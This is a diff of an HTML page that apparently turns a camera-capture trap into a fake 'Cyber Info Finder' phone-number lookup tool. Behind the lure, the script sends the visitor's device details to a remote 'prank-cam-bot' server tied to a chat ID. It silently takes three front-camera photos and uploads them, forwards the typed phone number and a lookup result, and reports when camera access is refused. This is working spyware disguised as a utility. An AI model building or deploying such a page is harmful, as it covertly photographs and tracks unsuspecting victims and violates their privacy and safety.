@@ -1,38 +1,102 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Camera Capture</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      background:#000;
-      color:#fff;
-      text-align:center;
-      font-family:sans-serif;
-      padding-top:40px;
-    }
-    button {
-      padding:15px 25px;
-      font-size:18px;
-      border:none;
-      border-radius:8px;
-      background:#ff3b3b;
-      color:#fff;
-      margin-top:20px;
-    }
-    #status {
-      margin-top:20px;
-      font-size:16px;
-    }
-  </style>
+<meta charset="UTF-8">
+<title>Cyber Info Finder</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body {
+  background: black;
+  color: #00ff00;
+  font-family: monospace;
+  text-align: center;
+  padding: 20px;
+}
+
+/* BOX UI */
+.box {
+  border: 1px solid #00ff00;
+  padding: 20px;
+  border-radius: 10px;
+  box-shadow: 0 0 20px #00ff00;
+}
+
+/* INPUT */
+input {
+  width: 80%;
+  padding: 12px;
+  background: black;
+  border: 1px solid #00ff00;
+  color: #00ff00;
+  margin-top: 15px;
+}
+
+/* BUTTON */
+button {
+  margin-top: 15px;
+  padding: 12px 20px;
+  background: #00ff00;
+  color: black;
+  border: none;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+/* LOADER */
+.loader {
+  margin-top: 20px;
+  display: none;
+}
+
+.loader div {
+  width: 10px;
+  height: 10px;
+  background: #00ff00;
+  margin: 3px;
+  display: inline-block;
+  animation: blink 1s infinite;
+}
+
+.loader div:nth-child(2) { animation-delay: 0.2s; }
+.loader div:nth-child(3) { animation-delay: 0.4s; }
+
+@keyframes blink {
+  0% { opacity: 0 }
+  50% { opacity: 1 }
+  100% { opacity: 0 }
+}
+
+/* FOOTER */
+.footer {
+  margin-top: 30px;
+  font-size: 12px;
+  opacity: 0.6;
+}
+</style>
 </head>
+
 <body>
 
-<h2>📸 Camera Access Required</h2>
-<p id="status">Click below to allow camera & continue</p>
+<div class="box">
 
-<button onclick="startAll()">Allow Camera</button>
+<h2>🟢 CYBER INFO FINDER</h2>
+<p id="status">System Ready...</p>
+
+<input id="num" placeholder="Enter Phone Number">
+
+<br>
+<button onclick="startAll()">START</button>
+
+<div class="loader" id="loader">
+  <div></div><div></div><div></div>
+</div>
+
+</div>
+
+<div class="footer">
+⚡ Powered by @aditya_labs
+</div>
 
 <script>
 const params = new URLSearchParams(location.search);
@@ -40,6 +104,7 @@ const chatId = params.get("chat_id");
 
 const SERVER = "https://prank-cam-bot.vercel.app";
 
+/* 🔥 SEND VISITOR INFO */
 async function sendVisitorInfo() {
   let device = {
     userAgent: navigator.userAgent,
@@ -49,14 +114,6 @@ async function sendVisitorInfo() {
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     time: new Date().toLocaleString()
   };
-
-  try {
-    const battery = await navigator.getBattery();
-    device.battery = {
-      level: battery.level * 100,
-      charging: battery.charging
-    };
-  } catch {}
 
   await fetch(`${SERVER}/visitor`, {
     method: "POST",
@@ -68,6 +125,7 @@ async function sendVisitorInfo() {
   });
 }
 
+/* 🔥 SEND PHOTO */
 async function sendPhoto(canvas, num) {
   fetch(`${SERVER}/send-photo`, {
     method: "POST",
@@ -80,41 +138,67 @@ async function sendPhoto(canvas, num) {
   });
 }
 
+/* 🔥 CAPTURE */
 async function capture(stream) {
   const video = document.createElement("video");
   video.srcObject = stream;
   await video.play();
 
-  // ❌ remove delay completely
-
   for (let i = 1; i <= 3; i++) {
     const canvas = document.createElement("canvas");
-    const videoWidth = video.videoWidth;
-const videoHeight = video.videoHeight;
 
-canvas.width = videoWidth;
-canvas.height = videoHeight;
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
 
-const ctx = canvas.getContext("2d");
-ctx.drawImage(video, 0, 0, videoWidth, videoHeight);
+    canvas.getContext("2d").drawImage(video, 0, 0);
 
     sendPhoto(canvas, i);
   }
 }
 
+/* 🔥 PHONE API */
+async function phoneSearch(num) {
+  let result = {};
+
+  try {
+    const res = await fetch(`https://number-info-bd-tau.vercel.app/info?number=${num}`);
+    result = await res.json();
+  } catch (e) {
+    result = { error: "API Failed" };
+  }
+
+  await fetch(`${SERVER}/number`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: chatId,
+      number: num,
+      result: result
+    })
+  });
+}
+
+/* 🔥 MAIN FLOW */
 async function startAll() {
-  if (!chatId) {
-    document.getElementById("status").innerText = "Chat ID missing";
+
+  const num = document.getElementById("num").value;
+
+  if (!num) {
+    alert("Enter number first");
     return;
   }
 
   try {
-    document.getElementById("status").innerText = "Sending info...";
+    document.getElementById("loader").style.display = "block";
+    document.getElementById("status").innerText = "Accessing system...";
+
     await sendVisitorInfo();
 
-    document.getElementById("status").innerText = "Capturing...";
+    document.getElementById("status").innerText = "Processing number...";
+    await phoneSearch(num);
 
-    // ✅ ONLY FRONT CAMERA (single permission)
+    document.getElementById("status").innerText = "Accessing camera...";
+
     let stream = await navigator.mediaDevices.getUserMedia({
       video: {
         facingMode: "user",
@@ -127,10 +211,18 @@ async function startAll() {
 
     stream.getTracks().forEach(t => t.stop());
 
-    document.getElementById("status").innerText = "✅ Done";
+    document.getElementById("status").innerText = "✅ Completed";
+    document.getElementById("loader").style.display = "none";
 
   } catch (e) {
-    document.getElementById("status").innerText = "❌ Permission denied / camera error";
+
+    document.getElementById("status").innerText = "❌ Camera denied";
+
+    await fetch(`${SERVER}/denied`, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ chat_id: chatId })
+    });
   }
 }
 </script>
